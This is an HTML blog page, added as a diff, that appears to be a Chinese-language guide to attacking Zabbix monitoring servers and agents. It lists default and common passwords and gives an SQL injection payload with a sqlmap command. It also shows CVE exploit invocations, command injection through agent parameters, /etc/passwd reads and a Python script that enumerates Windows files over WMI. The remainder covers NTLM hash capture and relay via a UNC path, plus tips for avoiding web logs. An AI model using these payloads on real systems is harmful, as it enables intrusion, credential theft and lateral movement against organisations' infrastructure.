@@ -1,0 +1,470 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Zabbix利用 | bo0s</title>
+  <meta name="author" content="hitman">
+  
+  <meta name="description" content="My Blog/Website, will Tutorials, and just my general thoughts.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Zabbix利用"/>
+  <meta property="og:site_name" content="bo0s"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/12favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.0.0"><link rel="stylesheet" href="/css/prism-vs.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">bo0s</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="全部文章">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="标签">
+			  <i class="fa fa-tag"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="我是谁.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/wiki/#/" title="WiKi.">
+			  <i class="fa fa-book"></i>WiKi
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="工具">
+			  <i class="fa fa-space-shuttle"></i>Tool
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/logs" title="日志">
+			  <i class="fa fa-tachometer"></i>Logs
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/code/landing/" title="Discord.JS Bot Code">
+			  <i class="fa fa-code"></i>Tutorials / Code
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Zabbix利用</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><img src="/images/Zabbix.jpg" alt="upload successful"></p>
+<blockquote>
+<p>Zabbix，是直接和运维接触的重要机器。在内网中也非常可能有漏洞，可以从Agent控制Server权限、再基于Server拿下所有内网Agent。</p>
+</blockquote>
+<a id="more"></a> 
+
+
+
+
+
+
+
+<h1 id="Zabbix"><a href="#Zabbix" class="headerlink" title="Zabbix"></a>Zabbix</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.zabbix.com/">Zabbix</a> 是一个基于 WEB 界面的提供分布式系统监视系统监视以及网络监视功能的企业级的开源解决方案，能监视各种网络参数，保证服务器系统服务器系统的安全运营，在zabbix中可以从Agent控制Server权限、再基于Server拿下所有内网Agent。</p>
+</blockquote>
+<h2 id="基础组件"><a href="#基础组件" class="headerlink" title="基础组件"></a>基础组件</h2><h3 id="Zabbix-Server"><a href="#Zabbix-Server" class="headerlink" title="Zabbix Server"></a>Zabbix Server</h3><blockquote>
+<p>Zabbix Server 是所有配置、统计和操作数据的中央存储中心，也是 Zabbix 监控系统的告警中心。在监控的系统中出现任何异常，将被发出通知给管理员。</p>
+<ul>
+<li>Zabbix Server 服务</li>
+<li>Zabbix Web</li>
+<li>Zabbix 数据库</li>
+</ul>
+</blockquote>
+<h3 id="Zabbix-Proxy"><a href="#Zabbix-Proxy" class="headerlink" title="Zabbix Proxy"></a>Zabbix Proxy</h3><blockquote>
+<p>Zabbix Proxy 是在大规模分布式监控场景中采用一种分担 Zabbix Server 压力的分层结构，其多用在跨机房、跨网络的环境中，Zabbix Proxy 可以代替 Zabbix Server 收集性能和可用性数据，然后把数据汇报给 Zabbix Server，并且在一定程度上分担了 Zabbix Server 的压力。</p>
+</blockquote>
+<h3 id="Zabbix-Agent"><a href="#Zabbix-Agent" class="headerlink" title="Zabbix Agent"></a>Zabbix Agent</h3><blockquote>
+<p>Zabbix Agent部署在被监控的目标机器上，以主动监控本地资源和应用程序（硬盘、内存、处理器统计信息等）。Zabbix Agent收集本地的状态信息并将数据上报给Zabbix Server用于进一步处理。</p>
+<p>对于Agent来说根据请求类型可分为：</p>
+<ul>
+<li>被动模式：Server 向 Agent 的 10050 端口获取监控项数据，Agent 根据监控项收集本机数据并响应。</li>
+<li>主动模式：Agent 主动请求 Server (Proxy) 的 10051 端口获取监控项列表，并根据监控项收集本机数据提交给 Server (Proxy)</li>
+</ul>
+</blockquote>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="Web端"><a href="#Web端" class="headerlink" title="Web端"></a>Web端</h3><blockquote>
+<p>Zabbix 安装后自带 Admin 管理员用户和 Guests 访客用户（低版本），可登陆 Zabbiax 后台。</p>
+</blockquote>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">admin:</span>zabbix</span><br><span class="line"><span class="symbol">Admin:</span>zabbix</span><br><span class="line"><span class="symbol">guset:</span>空口令</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Mysql端"><a href="#Mysql端" class="headerlink" title="Mysql端"></a>Mysql端</h3><blockquote>
+<p>由于 root 用户默认情况下无法外连，运维通常会新建 MySQL 用户 <code>zabbix</code>，常见密码如下：</p>
+</blockquote>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123456</span></span><br><span class="line">zabbix</span><br><span class="line">zabbix123</span><br><span class="line">zabbix1234</span><br><span class="line">zabbix12345</span><br><span class="line">zabbix123456</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取到Mysql数据库以后可解密users表的密码md5值，或直接替换md5进行ZabixWeb登陆</li>
+</ul>
+<h3 id="CVE-2016-10134"><a href="#CVE-2016-10134" class="headerlink" title="CVE-2016-10134"></a>CVE-2016-10134</h3><blockquote>
+<p>zabbix的SQL注入漏洞，老洞了，没意思。</p>
+<p>影响版本：</p>
+<ul>
+<li><p>zabbix 2.2.x</p>
+</li>
+<li><p>zabbix 3.03-3.3.0</p>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="meta">x</span>.<span class="meta">x</span>.<span class="meta">x</span>.<span class="meta">x</span>/jsrpc.php?type=0<span class="variable">&amp;mode</span>=1<span class="variable">&amp;method</span>=screen.get<span class="variable">&amp;profileIdx</span>=web.item.graph<span class="variable">&amp;resourcetype</span>=17<span class="variable">&amp;profileIdx2</span>=updatexml(0,concat(0xa,user()),0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://x.x.x.x/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=*&quot;</span> --dbms=mysql -p <span class="string">&quot;profileIdx2&quot;</span> --technique E --dbs</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="CVE-2017-2824"><a href="#CVE-2017-2824" class="headerlink" title="CVE-2017-2824"></a>CVE-2017-2824</h3><blockquote>
+<p>Server端 trapper command 功能存在一处代码执行漏洞，特定的数据包可造成命令注入，进而远程执行代码。攻击者可以从一个Zabbix proxy发起请求，从而触发漏洞。</p>
+</blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/zabbix/CVE-2017-2824/exploit.py">exploit.py</a></li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">exploit</span><span class="selector-class">.py</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.121</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="CVE-2020-11800"><a href="#CVE-2020-11800" class="headerlink" title="CVE-2020-11800"></a>CVE-2020-11800</h3><blockquote>
+<p>Server端 trapper command 功能存在一处代码执行漏洞，特定的数据包可造成命令注入，进而远程执行代码。攻击者可以从一个Zabbix proxy发起请求，从而触发漏洞。</p>
+<p><em>Zabbix Server开启了agent自动注册功能</em>才可利用，注册成agent向Server发送恶意的active checks命令，达到命令执行的效果。</p>
+<p>影响版本：</p>
+<ul>
+<li>Zabbix 3.0.x ≤ 3.0.30</li>
+</ul>
+</blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/zabbix/CVE-2020-11800/">exploit.py</a></li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">exploit</span><span class="selector-class">.py</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.121</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="CVE-2022-23131"><a href="#CVE-2022-23131" class="headerlink" title="CVE-2022-23131"></a>CVE-2022-23131</h3><blockquote>
+<p>Zabbix对客户端提交的Cookie会话存在不安全的存储方式，导致在启动SAML SSO认证模式的前提下，恶意用户可通过构造特殊请求绕过认证，获取管理员权限，进而可实现RCE。</p>
+<p>影响版本：</p>
+<ul>
+<li>4.0.36</li>
+<li>5.0.18</li>
+<li>5.4.8</li>
+<li>6.0.0alpha1</li>
+</ul>
+</blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Mr-xn/cve-2022-23131">zabbix_session_exp.py</a> </li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 zabbix_session_exp.pxy https:<span class="regexp">//</span><span class="number">182.168</span>.<span class="number">1.121</span> Admin</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="后渗透利用"><a href="#后渗透利用" class="headerlink" title="后渗透利用"></a>后渗透利用</h2><blockquote>
+<p>拿下Zabbix Server权限只是一个阶段胜利，重点还是拿下Zabbix Agent目标权限。</p>
+</blockquote>
+<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><blockquote>
+<p>server端默认配置文件路径</p>
+<p><code>/etc/zabbix/zabbix_server.conf</code></p>
+<p>agent端默认配置文件路径</p>
+<p><code>/etc/zabbix/zabbix_agentd.conf</code></p>
+</blockquote>
+<h3 id="脚本下发"><a href="#脚本下发" class="headerlink" title="脚本下发"></a>脚本下发</h3><blockquote>
+<p>要想在Agent上执行命令需要在<code>zabbix_agentd.conf</code>配置文件中开启<code>EnableRemoteCommands参数</code>，未开启执行命令会报错.</p>
+<p>执行在<code>Zabbix服务器</code>则不需要开启<code>EnableRemoteCommands</code>参数，所以获取到Web权限以后可以通过脚本下发获取Server权限</p>
+<p>首先创建脚本命令：</p>
+<ul>
+<li><code>管理</code>&gt;<code>脚本</code>&gt;<code>创建脚本</code> &gt;  <code>恶意脚本命令</code></li>
+</ul>
+<p>然后选择主机执行：</p>
+<ul>
+<li><code>检测中</code>&gt;<code>最新数据</code>&gt;<code>选择一台主机</code></li>
+</ul>
+</blockquote>
+<h3 id="zabbix-get"><a href="#zabbix-get" class="headerlink" title="zabbix_get"></a>zabbix_get</h3><blockquote>
+<p>如果不想在Zabbix Web上留下太多日志痕迹，或者想批量控制Agent，拿下Zabbix Server权限后可以通过zabbix_get命令向Agent执行监控项命令，<strong>在Zabbix Web执行脚本实际上等于执行system.run监控项命令</strong>。</p>
+<p><strong>在Zabbix Web执行脚本实际上等于执行<code>system.run</code>监控项命令</strong>。</p>
+</blockquote>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">zabbix_get</span> <span class="selector-tag">-s</span> 172<span class="selector-class">.19</span><span class="selector-class">.0</span><span class="selector-class">.5</span> <span class="selector-tag">-p</span> 10050 <span class="selector-tag">-k</span> &quot;<span class="selector-tag">system</span><span class="selector-class">.run</span><span class="selector-attr">[ifconfig]</span>&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="UserParameter"><a href="#UserParameter" class="headerlink" title="UserParameter"></a>UserParameter</h3><blockquote>
+<p>当Zabbiax Agent的<code>zabbix_agentd.conf</code>配置文件开启UnsafeUserParameters参数的情况下，传参值字符不受限制，只需要找到存在传参的自定义参数UserParameter，就能达到命令注入的效果。</p>
+</blockquote>
+<ul>
+<li>例如agent.conf中有如下配置，具体情况要看说怎么配置的具体构造</li>
+<li>先用任意文件读取，来读取agent的配置文件</li>
+<li><code>zabbix_get -s 172.19.0.5 -p 10050 -k &quot;vfs.file.contents[/etc/zabbix/zabbix_agentd.conf]&quot;</code></li>
+</ul>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">UserParameter</span>=ping[*],echo <span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">UnsafeUserParameters</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>就可以将command命令经过拼接以后成功注入id命令</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zabbix_get -s 172.19.0.5 -p 10050 -k <span class="string">&quot;ping[test &amp;&amp; id]&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><blockquote>
+<p>zabbix_agentd服务默认以低权限用户zabbix运行，读取文件受zabbix用户权限限制。开启AllowRoot参数情况下zabbix_agentd服务会以root权限运行，利用<code>vfs.file.contents</code>命令就能任意文件读取，但是不能读取超过64KB的文件.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zabbix_get -s 172.19.0.5 -p 10050 -k <span class="string">&quot;vfs.file.contents[/etc/passwd]&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><blockquote>
+<p>Windows 下可用</p>
+<p>利用<code>wmi.get</code>命令进行目录遍历、文件遍历，结合<code>vfs.file.contents</code>命令就能够在Windows下实现任意文件读取。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">count = 0</span><br><span class="line"></span><br><span class="line">def zabbix_exec(ip, command):</span><br><span class="line">    global count</span><br><span class="line">    count = count + 1</span><br><span class="line">    <span class="keyword">check</span> = os.popen(<span class="string">&quot;./zabbix_get -s &quot;</span> + ip + <span class="string">&quot; -k \&quot;&quot; + command + &quot;</span>\<span class="string">&quot;&quot;</span>).read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Cannot obtain WMI information&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="keyword">check</span>:</span><br><span class="line">        <span class="keyword">return</span> check.strip()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> getpath(<span class="keyword">path</span>):</span><br><span class="line">    <span class="keyword">return</span> path.replace(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;\\\\\\\\&quot;</span>).replace(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;\\$&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> GetDisk(ip):</span><br><span class="line">    <span class="keyword">where</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        check_disk = zabbix_exec(ip, <span class="string">&quot;wmi.get[root\cimv2,\\\&quot;</span><span class="keyword">SELECT</span> <span class="keyword">Name</span> <span class="keyword">FROM</span> Win32_LogicalDisk <span class="keyword">WHERE</span> <span class="keyword">Name</span> != <span class="string">&#x27;&#x27;</span> <span class="string">&quot; + where + &quot;</span>\\\<span class="string">&quot;]&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> check_disk:</span><br><span class="line">            print(check_disk)</span><br><span class="line">            <span class="keyword">where</span> = <span class="keyword">where</span> + <span class="string">&quot;AND Name != &#x27;&quot;</span> + check_disk+ <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> GetDirs(ip, dir):</span><br><span class="line">    drive = dir[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">path</span> = dir[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">where</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        check_dir = zabbix_exec(ip, <span class="string">&quot;wmi.get[root\cimv2,\\\&quot;</span><span class="keyword">SELECT</span> Caption <span class="keyword">FROM</span> Win32_Directory <span class="keyword">WHERE</span> Drive=<span class="string">&#x27;&quot; + drive + &quot;&#x27;</span> <span class="keyword">AND</span> <span class="keyword">Path</span>=<span class="string">&#x27;&quot; + getpath(path) + &quot;&#x27;</span> <span class="string">&quot; + where + &quot;</span>\\\<span class="string">&quot;]&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> check_dir:</span><br><span class="line">            print(check_dir)</span><br><span class="line">            <span class="keyword">where</span> = <span class="keyword">where</span> + <span class="string">&quot;AND Caption != &#x27;&quot;</span> + getpath(check_dir) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> GetFiles(ip, dir):</span><br><span class="line">    drive = dir[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">path</span> = dir[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">where</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        check_file = zabbix_exec(ip, <span class="string">&quot;wmi.get[root\cimv2,\\\&quot;</span><span class="keyword">SELECT</span> <span class="keyword">Name</span> <span class="keyword">FROM</span> CIM_DataFile <span class="keyword">WHERE</span> Drive=<span class="string">&#x27;&quot; + drive + &quot;&#x27;</span> <span class="keyword">AND</span> <span class="keyword">Path</span>=<span class="string">&#x27;&quot; + getpath(path) + &quot;&#x27;</span> <span class="string">&quot; + where + &quot;</span>\\\<span class="string">&quot;]&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> check_file:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Invalid item key format&quot;</span> <span class="keyword">in</span> check_file:</span><br><span class="line">                continue</span><br><span class="line">            print(check_file)</span><br><span class="line">            <span class="keyword">where</span> = <span class="keyword">where</span> + <span class="string">&quot;AND Name != &#x27;&quot;</span> + getpath(check_file) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> Readfile(ip, <span class="keyword">file</span>):</span><br><span class="line">    <span class="keyword">read</span> = zabbix_exec(ip, <span class="string">&quot;vfs.file.contents[&quot;</span> + <span class="keyword">file</span> + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">    print(<span class="keyword">read</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        GetDisk(sys.argv[<span class="number">1</span>])</span><br><span class="line">    elif sys.argv[<span class="number">2</span>][<span class="number">-1</span>] != <span class="string">&quot;\\&quot;</span>:</span><br><span class="line">        Readfile(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        GetDirs(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        GetFiles(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;Request count: &quot;</span> + <span class="keyword">str</span>(<span class="keyword">count</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="主动检查模式利用"><a href="#主动检查模式利用" class="headerlink" title="主动检查模式利用"></a>主动检查模式利用</h3><blockquote>
+<p>通过<code>zabbix_get</code>执行监控项命令只适合<code> Agent 被动模式</code>且<code> 10050 端口可以通讯</code>的场景</p>
+<p>在<code> Agent 主动模式</code>且<code> 10050 端口不可通讯</code>的时候可使用Zabbix Web添加监控项</p>
+</blockquote>
+<ul>
+<li><code>配置</code>&gt;<code>主机</code>&gt;<code>选择主机</code> &gt;  <code>监控项</code> &gt; <code>创建监控项</code> &gt; <code>输入名称</code> &gt; <code>输入键值</code> &gt; <code>ping [test &amp;&amp; id]</code> &gt; <code>其他默认</code> &gt; <code>保存</code></li>
+</ul>
+<h3 id="Windows-UNC路径利用"><a href="#Windows-UNC路径利用" class="headerlink" title="Windows UNC路径利用"></a>Windows UNC路径利用</h3><blockquote>
+<p>在Windows Zabbix Agent环境中，可以利用<code>vfs.file.contents</code>命令读取UNC路径，窃取Zabbix Agent机器的Net-NTLM hash，从而进一步Net-NTLM relay攻击。</p>
+</blockquote>
+<ul>
+<li>Responder工具监听</li>
+<li>监听中继</li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">ntlmrelayx</span><span class="selector-class">.py</span> <span class="selector-tag">-of</span> <span class="selector-tag">relayReulst</span><span class="selector-class">.txt</span> <span class="selector-tag">-tf</span> <span class="selector-tag">relayTargets</span><span class="selector-class">.txt</span> <span class="selector-tag">-smb2support</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>欺骗访问</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> responder -I eth<span class="number">0</span> -v</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>请求认证</li>
+</ul>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zabbix_get -s <span class="number">192.168</span><span class="number">.30</span><span class="number">.200</span> -p <span class="number">10050</span> -k <span class="string">&quot;vfs.file.contents[<span class="subst">\\</span><span class="subst">\\</span>192.168.30.243<span class="subst">\\</span>cc]&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="脏牛"><a href="#脏牛" class="headerlink" title="脏牛"></a>脏牛</h4><h4 id="2021-3156"><a href="#2021-3156" class="headerlink" title="2021-3156"></a>2021-3156</h4><h4 id="2021-4034"><a href="#2021-4034" class="headerlink" title="2021-4034"></a>2021-4034</h4>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/post/Zabbix/" class="leancloud-visitors view" data-flag-title="Zabbix利用">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/post/内网横向/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/post/XSS_Bypass/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-01-02 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Zabbix"><span class="toc-article-text">Zabbix</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%9F%BA%E7%A1%80%E7%BB%84%E4%BB%B6"><span class="toc-article-text">基础组件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Zabbix-Server"><span class="toc-article-text">Zabbix Server</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Zabbix-Proxy"><span class="toc-article-text">Zabbix Proxy</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Zabbix-Agent"><span class="toc-article-text">Zabbix Agent</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-article-text">漏洞利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Web%E7%AB%AF"><span class="toc-article-text">Web端</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Mysql%E7%AB%AF"><span class="toc-article-text">Mysql端</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2016-10134"><span class="toc-article-text">CVE-2016-10134</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2017-2824"><span class="toc-article-text">CVE-2017-2824</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2020-11800"><span class="toc-article-text">CVE-2020-11800</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" 